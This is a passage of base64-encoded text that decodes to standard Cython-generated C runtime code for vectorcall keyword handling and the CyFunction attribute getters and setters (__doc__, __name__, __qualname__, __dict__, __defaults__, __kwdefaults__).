VlcyA9IG5ld2FyZ3MgKyBuYXJncztcbiAgICBwb3MgPSBpID0gMDtcbiAgICBrZXlzX2FyZV9zdHJpbmdzID0gUHlfVFBGTEFHU19VTklDT0RFX1NVQkNMQVNTO1xuICAgIHdoaWxlIChQeURpY3RfTmV4dChrdywgJnBvcywgJmtleSwgJnZhbHVlKSkge1xuICAgICAgICBrZXlzX2FyZV9zdHJpbmdzICY9XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgICAgICBQeVR5cGVfR2V0RmxhZ3MoUHlfVFlQRShrZXkpKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIFB5X1RZUEUoa2V5KS0+dHBfZmxhZ3M7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBQeV9JTkNSRUYoa2V5KTtcbiAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIGlmICh1bmxpa2VseShQeVR1cGxlX1NldEl0ZW0oa3duYW1lcywgaSwga2V5KSA8IDApKSBnb3RvIGNsZWFudXA7XG4gICAgICAgICNlbHNlXG4gICAgICAgIFB5VHVwbGVfU0VUX0lURU0oa3duYW1lcywgaSwga2V5KTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGt3dmFsdWVzW2ldID0gdmFsdWU7XG4gICAgICAgIGkrKztcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFrZXlzX2FyZV9zdHJpbmdzKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLCAia2V5d29yZHMgbXVzdCBiZSBzdHJpbmdzIik7XG4gICAgICAgIGdvdG8gY2xlYW51cDtcbiAgICB9XG4gICAgcmVzID0gdmMoZnVuYywgbmV3YXJncywgbmFyZ3MsIGt3bmFtZXMpO1xuY2xlYW51cDpcbiAgICBQeV9ERUNSRUYoa3duYW1lcyk7XG4gICAgZm9yIChpID0gMDsgaSA8IG5rdzsgaSsrKVxuICAgICAgICBQeV9ERUNSRUYoa3d2YWx1ZXNbaV0pO1xuICAgIFB5TWVtX0ZyZWUobmV3YXJncyk7XG4gICAgcmV0dXJuIHJlcztcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprdylcbntcbiAgICBQeV9zc2l6ZV90IGt3X3NpemUgPVxuICAgICAgICBsaWtlbHkoa3cgPT0gTlVMTCkgP1xuICAgICAgICAwIDpcbiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgUHlEaWN0X1NpemUoa3cpO1xuI2Vsc2VcbiAgICAgICAgUHlEaWN0X0dFVF9TSVpFKGt3KTtcbiNlbmRpZlxuICAgIGlmIChrd19zaXplID09IDApIHtcbiAgICAgICAgcmV0dXJuIHZjKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTtcbiAgICB9XG4jaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgZWxzZSBpZiAodW5saWtlbHkoa3dfc2l6ZSA9PSAtMSkpIHtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuI2VuZGlmXG4gICAgcmV0dXJuIF9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3Rfa3coZnVuYywgdmMsIGFyZ3MsIG5hcmdzLCBrdyk7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uTm9NZXRob2QoUHlPYmplY3QgKmZ1bmMsIHZvaWQgKCpjZnVuYykodm9pZCkpIHtcbiAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl9DaGVjayhmdW5jKSkge1xuICAgICAgICByZXR1cm4gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYztcbiAgICB9IGVsc2UgaWYgKFB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpKSB7XG4gICAgICAgIHJldHVybiBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkge1xuICAgIGlmICgoUHlPYmplY3QqKVB5X1RZUEUoZnVuYykgPT0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSkge1xuICAgICAgICBpbnQgcmVzdWx0O1xuICAgICAgICBQeU9iamVjdCAqbmV3RnVuYyA9IFB5T2JqZWN0X0dldEF0dHIoZnVuYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Z1bmMpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW5ld0Z1bmMpKSB7XG4gICAgICAgICAgICBQeUVycl9DbGVhcigpOyAvLyBJdFwncyBvbmx5IGFuIG9wdGltaXphdGlvbiwgc28gZG9uXCd0IHRocm93IGFuIGVycm9yXG4gICAgICAgICAgICByZXR1cm4gMDtcbiAgICAgICAgfVxuICAgICAgICByZXN1bHQgPSBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbk5vTWV0aG9kKG5ld0Z1bmMsIGNmdW5jKTtcbiAgICAgICAgUHlfREVDUkVGKG5ld0Z1bmMpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb25Ob01ldGhvZChmdW5jLCBjZnVuYyk7XG59XG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKSB7XG4gICAgaWYgKFB5TWV0aG9kX0NoZWNrKGZ1bmMpKSB7XG4gICAgICAgIGZ1bmMgPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oZnVuYyk7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jO1xufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19DeUZ1bmN0aW9uX1NldENsYXNzT2JqKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqIGYsIFB5T2JqZWN0KiBjbGFzc29iaikge1xuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQoXG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZiksXG4gICAgICAgICAgICAoKGNsYXNzb2JqKSA/IF9fUHl4X05ld1JlZihjbGFzc29iaikgOiBOVUxMKSk7XG4jZWxzZVxuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKFxuICAgICAgICAoKFB5Q01ldGhvZE9iamVjdCAqKSAoZikpLT5tbV9jbGFzcyxcbiAgICAgICAgKFB5VHlwZU9iamVjdCopKChjbGFzc29iaikgPyBfX1B5eF9OZXdSZWYoY2xhc3NvYmopIDogTlVMTCkpO1xuI2VuZGlmXG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcClcbntcbiAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZG9jID09IE5VTEwpKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICBvcC0+ZnVuY19kb2MgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG9wLT5mdW5jLCAiX19kb2NfXyIpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW9wLT5mdW5jX2RvYykpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICAgICAgaWYgKCgoUHlDRnVuY3Rpb25PYmplY3QqKW9wKS0+bV9tbC0+bWxfZG9jKSB7XG4gICAgICAgICAgICBvcC0+ZnVuY19kb2MgPSBQeVVuaWNvZGVfRnJvbVN0cmluZygoKFB5Q0Z1bmN0aW9uT2JqZWN0KilvcCktPm1fbWwtPm1sX2RvYyk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZG9jID09IE5VTEwpKVxuICAgICAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpO1xuICAgICAgICAgICAgcmV0dXJuIFB5X05vbmU7XG4gICAgICAgIH1cbiNlbmRpZlxuICAgIH1cbiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfZG9jKTtcbiAgICByZXR1cm4gb3AtPmZ1bmNfZG9jO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY2xvc3VyZSkge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY2xvc3VyZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jX2xvY2tlZChvcCk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfZG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKHZhbHVlID09IE5VTEwpIHtcbiAgICAgICAgdmFsdWUgPSBQeV9Ob25lO1xuICAgIH1cbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX2RvYywgdmFsdWUpO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZV9sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApXG57XG4gICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX25hbWUgPT0gTlVMTCkpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIG9wLT5mdW5jX25hbWUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG9wLT5mdW5jLCAiX19uYW1lX18iKTtcbiNlbHNlXG4gICAgICAgIG9wLT5mdW5jX25hbWUgPSBQeVVuaWNvZGVfSW50ZXJuRnJvbVN0cmluZygoKFB5Q0Z1bmN0aW9uT2JqZWN0KilvcCktPm1fbWwtPm1sX25hbWUpO1xuI2VuZGlmXG4gICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19uYW1lID09IE5VTEwpKVxuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19uYW1lKTtcbiAgICByZXR1cm4gb3AtPmZ1bmNfbmFtZTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KVxue1xuICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBOVUxMO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWVfbG9ja2VkKG9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9uYW1lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwgfHwgIVB5VW5pY29kZV9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19uYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19uYW1lLCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9xdWFsbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dClcbntcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19xdWFsbmFtZSk7XG4gICAgcmVzdWx0ID0gb3AtPmZ1bmNfcXVhbG5hbWU7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfcXVhbG5hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dClcbntcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gTlVMTCB8fCAhUHlVbmljb2RlX0NoZWNrKHZhbHVlKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJfX3F1YWxuYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19xdWFsbmFtZSwgdmFsdWUpO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdF9sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApXG57XG4gICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RpY3QgPT0gTlVMTCkpIHtcbiAgICAgICAgb3AtPmZ1bmNfZGljdCA9IFB5RGljdF9OZXcoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RpY3QgPT0gTlVMTCkpXG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgUHlfSU5DUkVGKG9wLT5mdW5jX2RpY3QpO1xuICAgIHJldHVybiBvcC0+ZnVuY19kaWN0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RpY3QoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0X2xvY2tlZChvcCk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGljdChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgImZ1bmN0aW9uXCdzIGRpY3Rpb25hcnkgbWF5IG5vdCBiZSBkZWxldGVkIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFQeURpY3RfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgInNldHRpbmcgZnVuY3Rpb25cJ3MgZGljdGlvbmFyeSB0byBhIG5vbi1kaWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19kaWN0LCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9nbG9iYWxzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19nbG9iYWxzKTtcbiAgICByZXR1cm4gb3AtPmZ1bmNfZ2xvYmFscztcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9jbG9zdXJlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKG9wKTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBQeV9JTkNSRUYoUHlfTm9uZSk7XG4gICAgcmV0dXJuIFB5X05vbmU7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfY29kZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dClcbntcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gKG9wLT5mdW5jX2NvZGUpID8gb3AtPmZ1bmNfY29kZSA6IFB5X05vbmU7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgUHlfSU5DUkVGKHJlc3VsdCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25faW5pdF9kZWZhdWx0cyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkge1xuICAgIGludCByZXN1bHQgPSAwO1xuICAgIFB5T2JqZWN0ICpyZXMgPSBvcC0+ZGVmYXVsdHNfZ2V0dGVyKChQeU9iamVjdCAqKSBvcCk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXMpKVxuICAgICAgICByZXR1cm4gLTE7XG4gICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgb3AtPmRlZmF1bHRzX3R1cGxlID0gUHlUdXBsZV9HRVRfSVRFTShyZXMsIDApO1xuICAgIFB5X0lOQ1JFRihvcC0+ZGVmYXVsdHNfdHVwbGUpO1xuICAgIG9wLT5kZWZhdWx0c19rd2RpY3QgPSBQeVR1cGxlX0dFVF9JVEVNKHJlcywgMSk7XG4gICAgUHlfSU5DUkVGKG9wLT5kZWZhdWx0c19rd2RpY3QpO1xuICAgICNlbHNlXG4gICAgb3AtPmRlZmF1bHRzX3R1cGxlID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHJlcywgMCk7XG4gICAgaWYgKHVubGlrZWx5KCFvcC0+ZGVmYXVsdHNfdHVwbGUpKSByZXN1bHQgPSAtMTtcbiAgICBlbHNlIHtcbiAgICAgICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShyZXMsIDEpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW9wLT5kZWZhdWx0c19rd2RpY3QpKSByZXN1bHQgPSAtMTtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgUHlfREVDUkVGKHJlcyk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fc2V0X2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCogdmFsdWUsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAoIXZhbHVlKSB7XG4gICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHZhbHVlICE9IFB5X05vbmUgJiYgIVB5VHVwbGVfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgIl9fZGVmYXVsdHNfXyBtdXN0IGJlIHNldCB0byBhIHR1cGxlIG9iamVjdCIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5RXJyX1dhcm5FeChQeUV4Y19SdW50aW1lV2FybmluZywgImNoYW5nZXMgdG8gY3lmdW5jdGlvbi5fX2RlZmF1bHRzX18gd2lsbCBub3QgIlxuICAgICAgICAgICAgICAgICAiY3VycmVudGx5IGFmZmVjdCB0aGUgdmFsdWVzIHVzZWQgaW4gZnVuY3Rpb24gY2FsbHMiLCAxKTtcbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5kZWZhdWx0c190dXBsZSwgdmFsdWUpO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHNfbG9ja2VkKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7XG4gICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5kZWZhdWx0c190dXBsZTtcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHtcbiAgICAgICAgaWYgKG9wLT5kZWZhdWx0c19nZXR0ZXIpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9DeUZ1bmN0aW9uX2luaXRfZGVmYXVsdHMob3ApIDwgMCkpIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgcmVzdWx0ID0gb3AtPmRlZmF1bHRzX3R1cGxlO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlfTm9uZTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBQeV9JTkNSRUYocmVzdWx0KTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7XG4gICAgUHlPYmplY3QqIHJlc3VsdCA9IE5VTEw7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHNfbG9ja2VkKG9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9rd2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCogdmFsdWUsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAoIXZhbHVlKSB7XG4gICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHZhbHVlICE9IFB5X05vbmUgJiYgIVB5RGljdF9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19rd2RlZmF1bHRzX18gbXVzdCBiZSBzZXQgdG8gYSBkaWN0IG9iamVjdCIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5RXJyX1dhcm5FeChQeUV4Y19SdW50aW1lV2FybmluZywgImNoYW5nZXMgdG8gY3lmdW5jdGlvbi5fX2t3ZGVmYXVsdHNfXyB3aWxsIG5vdCAiXG4gICAgICAgICAgICAgICAgICJjdXJyZW50bHkgYWZmZWN0IHRoZSB2YWx1ZXMgdXNlZCBpbiBmdW5jdGlvbiBjYWxscyIsIDEpO1xuICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmRlZmF1bHRzX2t3ZGljdCwgdmFsdWUpO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfa3dkZWZhdWx0c19sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApIHtcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gb3AtPmRlZmF1bHRzX2t3ZGljdDtcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHtcbiAgICAgICAgaWYgKG9wLT5kZWZhdWx0c19nZXR0ZXIpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9DeUZ1bmN0aW9uX2luaXRfZGVmYXVsdHMob3A